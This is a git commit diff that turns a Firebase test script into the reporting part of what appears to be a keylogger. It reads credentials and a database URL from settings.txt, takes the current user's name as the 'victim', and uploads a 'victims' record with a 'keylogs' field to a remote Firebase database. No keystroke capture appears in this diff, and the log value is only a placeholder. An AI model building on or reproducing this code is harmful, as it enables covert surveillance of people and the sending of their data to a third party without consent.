6180d7157396fd63d917d8e4b3a3ddd7fc801030
Liam <102763734+Liammkr@users.noreply.github.com>
2024-02-03 00:48:15 +0000

    Update

--- WSTLOG.py
+++ WSTLOG.py
@@ -1,11 +1,30 @@
 import firebase_admin
 from firebase_admin import credentials
 from firebase_admin import db
-
+import re
+import os
+import pwd
+def get_username():
+    # Use 'os.getuid()' to get the user ID of the current user, and then pass it to 'pwd.getpwuid' to get the user information.
+    # The '[0]' index extracts the username from the user information.
+    return pwd.getpwuid(os.getuid())[0]
+victm = get_username()
+keylogs = "[START LOG] "
+with open('settings.txt', 'r') as file:
+        # Read the file line by line
+        lines = file.readlines()
+        # Iterate over the lines
+        for i in range(0, len(lines), 2):
+            if i + 1 < len(lines):  # Check if there are enough lines left in the file
+                credspath = re.search(r'credspath="(.*?)"', lines[i])
+                urlpath = re.search(r'firebaseappurlpath="(.*?)"', lines[i + 1])
+                if credspath and urlpath:
+                    credsfinal = credspath.group(1)
+                    urlfinal = urlpath.group(1)
 # Initialize Firebase with your service account credentials
-cred = credentials.Certificate("testcreds.json")
+cred = credentials.Certificate(credsfinal)
 firebase_admin.initialize_app(cred, {
-    'databaseURL': 'https://logtestwst-default-rtdb.firebaseio.com'
+    'databaseURL': str(urlfinal)
 })
 
 # Get a reference to the Firebase Realtime Database
@@ -13,14 +32,10 @@ ref = db.reference('/')
 
 # Define the data you want to write
 data = {
-    'users': {
-        'user1': {
-            'name': 'John',
-            'age': 30
-        },
-        'user2': {
-            'name': 'Alice',
-            'age': 25
+    'victims': {
+        str(victm): {
+            'name': str(victm),
+            'logs': str(keylogs)
         }
     }
 }
